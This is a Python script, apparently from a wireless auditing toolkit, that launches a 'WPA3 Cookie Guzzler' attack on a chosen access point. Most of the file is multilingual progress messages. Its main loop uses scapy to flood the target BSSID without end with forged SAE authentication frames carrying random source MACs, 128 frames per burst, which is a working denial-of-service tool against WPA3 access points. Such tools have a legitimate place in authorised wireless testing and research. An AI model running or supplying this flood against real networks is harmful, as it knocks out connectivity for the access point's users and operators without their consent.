#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
from scapy.all import sendp, Dot11, RadioTap, Dot11Auth, RandMAC

GROUP_ID_BYTES = b"\x13\x00"
arr = {}

def language_strings():
	pot = "\033[36mPoT\033[0m "
	global arr
	arr = {
		("ENGLISH", 0): "Initializing Cookie Guzzler attack...",
		("SPANISH", 0): "Inicializando el ataque Cookie Guzzler...",
		("FRENCH", 0): "Initialisation de l'attaque Cookie Guzzler...",
		("CATALAN", 0): "Inicialitzant l'atac Cookie Guzzler...",
		("PORTUGUESE", 0): "Iniciando o ataque Cookie Guzzler...",
		("RUSSIAN", 0): f"{pot}Инициализация атаки Cookie Guzzler...",
		("GREEK", 0): f"{pot}Εκκίνηση επίθεσης Cookie Guzzler...",
		("ITALIAN", 0): "Inizializzando l'attacco Cookie Guzzler...",
		("POLISH", 0): f"{pot}Inicjalizacja ataku Cookie Guzzler...",
		("GERMAN", 0): "Initialisierung des Cookie-Guzzler-Angriffs...",
		("TURKISH", 0): f"{pot}Cookie Guzzler saldırısı başlatılıyor...",
		("ARABIC", 0): f"{pot}بدء هجوم Cookie Guzzler...",
		("CHINESE", 0): "正在初始化 Cookie Guzzler 攻击...",

		("ENGLISH", 1): "Launching WPA3 Cookie Guzzler attack",
		("SPANISH", 1): "Lanzando ataque Cookie Guzzler WPA3",
		("FRENCH", 1): "Lancement de l'attaque WPA3 Cookie Guzzler",
		("CATALAN", 1): "Llançant l'atac WPA3 Cookie Guzzler",
		("PORTUGUESE", 1): "Iniciando o ataque WPA3 Cookie Guzzler",
		("RUSSIAN", 1): f"{pot}Запуск атаки WPA3 Cookie Guzzler",
		("GREEK", 1): f"{pot}Εκκίνηση επίθεσης WPA3 Cookie Guzzler",
		("ITALIAN", 1): "Avviando l'attacco WPA3 Cookie Guzzler",
		("POLISH", 1): f"{pot}Uruchamianie ataku WPA3 Cookie Guzzler",
		("GERMAN", 1): "Starte WPA3 Cookie-Guzzler-Angriff",
		("TURKISH", 1): f"{pot}WPA3 Cookie Guzzler saldırısı başlatılıyor",
		("ARABIC", 1): f"{pot}بدء هجوم WPA3 Cookie Guzzler",
		("CHINESE", 1): "启动 WPA3 Cookie Guzzler 攻击",

		("ENGLISH", 2): "Target: {bssid} on channel {channel}",
		("SPANISH", 2): "Objetivo: {bssid} en el canal {channel}",
		("FRENCH", 2): "Cible : {bssid} sur le canal {channel}",
		("CATALAN", 2): "Objectiu: {bssid} al canal {channel}",
		("PORTUGUESE", 2): "Alvo: {bssid} no canal {channel}",
		("RUSSIAN", 2): f"{pot}Цель: {{bssid}} на канале {{channel}}",
		("GREEK", 2): f"{pot}Στόχος: {{bssid}} στο κανάλι {{channel}}",
		("ITALIAN", 2): "Obiettivo: {bssid} sul canale {channel}",
		("POLISH", 2): f"{pot}Cel: {{bssid}} na kanale {{channel}}",
		("GERMAN", 2): "Ziel: {bssid} auf Kanal {channel}",
		("TURKISH", 2): f"{pot}Hedef: {{bssid}} kanal {{channel}}",
		("ARABIC", 2): f"{pot}الهدف: {{bssid}} على القناة {{channel}}",
		("CHINESE", 2): "目标: {bssid} 在信道 {channel}",

		("ENGLISH", 3): "Starting Cookie Guzzler flood on {interface}...",
		("SPANISH", 3): "Iniciando flood Cookie Guzzler en {interface}...",
		("FRENCH", 3): "Démarrage du flood Cookie Guzzler sur {interface}...",
		("CATALAN", 3): "Iniciant flood Cookie Guzzler a {interface}...",
		("PORTUGUESE", 3): "Iniciando flood Cookie Guzzler em {interface}...",
		("RUSSIAN", 3): f"{pot}Запуск флуд атаки Cookie Guzzler на {{interface}}...",
		("GREEK", 3): f"{pot}Εκκίνηση flood Cookie Guzzler στο {{interface}}...",
		("ITALIAN", 3): "Iniziando flood Cookie Guzzler su {interface}...",
		("POLISH", 3): f"{pot}Rozpoczynanie zalewu Cookie Guzzler na {{interface}}...",
		("GERMAN", 3): "Starte Cookie Guzzler Flood auf {interface}...",
		("TURKISH", 3): f"{pot}{{interface}} üzerinde Cookie Guzzler flood başlatılıyor...",
		("ARABIC", 3): f"{pot}بدء فيضان Cookie Guzzler على {{interface}}...",
		("CHINESE", 3): "在 {interface} 上启动 Cookie Guzzler 攻击...",

		("ENGLISH", 4): "Sent {count} frames...",
		("SPANISH", 4): "Enviados {count} frames...",
		("FRENCH", 4): "{count} trames envoyées...",
		("CATALAN", 4): "Enviats {count} frames...",
		("PORTUGUESE", 4): "{count} frames enviados...",
		("RUSSIAN", 4): f"{pot}Отправлено кадров: {{count}}...",
		("GREEK", 4): f"{pot}Εστάλησαν {{count}} frames...",
		("ITALIAN", 4): "Inviati {count} frame...",
		("POLISH", 4): f"{pot}Wysłano {{count}} ramek...",
		("GERMAN", 4): "{count} Frames gesendet...",
		("TURKISH", 4): f"{pot}{{count}} çerçeve gönderildi...",
		("ARABIC", 4): f"{pot}أُرسلت {{count}} إطارات...",
		("CHINESE", 4): "当前已发送 {count} 帧...",
	}

def get_message(language, key, **kwargs):
	return arr.get((language, key), arr.get(("ENGLISH", key), "")).format(**kwargs)

def parse_args(argv):
	if len(argv) < 6:
		sys.exit("Usage: wpa3_cookie_guzzler.py <bssid> <channel> <interface> <language> <scalar_hex> <finite_field_element_hex>")
	return {
		"bssid": argv[0],
		"channel": argv[1],
		"interface": argv[2],
		"language": argv[3],
		"scalar": bytes.fromhex(argv[4]),
		"finite_field_element": bytes.fromhex(argv[5]),
	}

def build_payload(scalar_bytes, finite_bytes):
	return GROUP_ID_BYTES + scalar_bytes + finite_bytes

def main():
	sys.stdout.reconfigure(line_buffering=True, write_through=True)
	use_cr = sys.stdout.isatty()
	args = parse_args(sys.argv[1:])
	language_strings()
	print(get_message(args["language"], 0), flush=True)
	payload = build_payload(args["scalar"], args["finite_field_element"])

	print()
	print(get_message(args["language"], 1), flush=True)
	print(get_message(args["language"], 2, bssid=args["bssid"], channel=args["channel"]), flush=True)
	print(get_message(args["language"], 3, interface=args["interface"]), flush=True)
	print()

	counter = 0
	next_log = 2000
	progress_printed = False
	try:
		while True:
			src_mac = str(RandMAC())

			dot11 = Dot11(type=0, subtype=11, addr1=args["bssid"], addr2=src_mac, addr3=args["bssid"])
			auth = Dot11Auth(algo=3, seqnum=1, status=0)
			packet = RadioTap()/dot11/auth/payload

			sendp(packet, count=128, inter=0.0001, iface=args["interface"], verbose=0)

			counter += 128
			if counter >= next_log:
				msg = get_message(args["language"], 4, count=counter)
				if use_cr:
					sys.stdout.write(f"\r{msg}\x1b[K")
					sys.stdout.flush()
				else:
					if progress_printed:
						sys.stdout.write("\033[F")
					sys.stdout.write(f"{msg}\x1b[K\n")
					sys.stdout.flush()
					progress_printed = True
				next_log += 2000
	except KeyboardInterrupt:
		pass

if __name__ == "__main__":
	main()
